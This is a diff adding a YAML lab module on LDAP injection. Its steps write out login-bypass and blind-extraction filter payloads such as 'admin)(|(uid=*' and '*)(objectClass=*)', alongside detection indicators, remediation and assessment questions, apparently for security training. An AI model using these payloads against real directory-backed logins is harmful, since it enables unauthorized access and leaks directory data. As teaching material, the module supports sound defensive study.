@@ -1,0 +1,105 @@
+# Category: Offensive Security - Web
+name: "LDAP Injection – Bypass Authentication and Information Disclosure"
+id: "web-ldap-injection-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit unsanitized user input in LDAP queries to modify the search filter,
+  bypass authentication, or extract sensitive directory information. Common
+  in applications that perform user authentication or searches against an
+  LDAP directory (e.g., Active Directory, OpenLDAP).
+
+learning_objectives:
+  - Understand LDAP filter syntax and query construction
+  - Inject malicious LDAP filters to bypass authentication
+  - Extract attributes using blind LDAP injection
+  - Use LDAP wildcards and Boolean logic
+
+tools:
+  - Burp Suite
+  - ldapsearch (command-line)
+  - Python (ldap3)
+  - custom scripts
+
+prerequisites:
+  - Application with LDAP search functionality (e.g., login form, search bar)
+  - Basic knowledge of LDAP filter grammar
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify LDAP injection points"
+    commands:
+      - "# Test login form with payloads"
+      - "username = *)(&"
+      - "password = *"
+      - "# Or use username = admin)(|(uid=*"
+    expected_output: "Successful login if filter is vulnerable; or application errors"
+    detection: "Abnormal LDAP queries in application logs"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Bypass authentication using injection"
+    commands:
+      - "# Payload to bypass LDAP login:"
+      - "username = admin)(|(uid=*"
+      - "password = anything"
+      - "# The filter becomes: (&(uid=admin)(|(uid=*)(userPassword=anything))"
+      - "# This returns true if uid=admin exists"
+    expected_output: "Logged in as admin without valid password"
+    detection: "LDAP bind results showing unexpected DN"
+
+  - id: "step3"
+    phase: "information_disclosure"
+    action: "Extract directory attributes via blind injection"
+    commands:
+      - "# Use Boolean‑based blind injection to guess attribute values"
+      - "username = admin)(&(objectClass=*)(uid=admin)(cn=a*"
+      - "# Test character by character"
+      - "# Or use wildcards in search to list all entries"
+      - "username = *)(objectClass=*)"
+    expected_output: "List of directory entries or sensitive attributes"
+    detection: "Large LDAP search result sets (size limit exceeded)"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1552"
+    description: "Unsecured Credentials (via LDAP)"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "LDAP queries containing parentheses, asterisks, or '&', '|' in user fields"
+  log_indicators:
+    - "Application logs showing malformed LDAP search filters"
+    - "AD event IDs 4662 (directory service access) with unusual search bases"
+  endpoint_indicators:
+    - "Automated scripts generating LDAP requests"
+
+remediation:
+  immediate:
+    - "Escape all user input for LDAP (use proper encoding functions)"
+    - "Use parameterized LDAP queries (e.g., `ldap3` with `search_filter` parameters)"
+  long_term:
+    - "Implement input validation whitelists for LDAP search fields"
+    - "Use a dedicated LDAP API that prevents injection"
+
+variables:
+  ldap_base: "ou=users,dc=example,dc=com"
+  target_user: "admin"
+
+assessment_questions:
+  - "What special characters in LDAP filters can be used for injection?"
+  - "How can blind LDAP injection be used to extract passwords?"
+  - "What is the difference between LDAP injection and SQL injection?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/LDAP_Injection"
+    title: "OWASP LDAP Injection"
+  - url: "https://www.blackhat.com/presentations/bh-europe-08/Fodil/BH-EU-08-Fodil-LDAP.pdf"
+    title: "BlackHat – LDAP Injection"
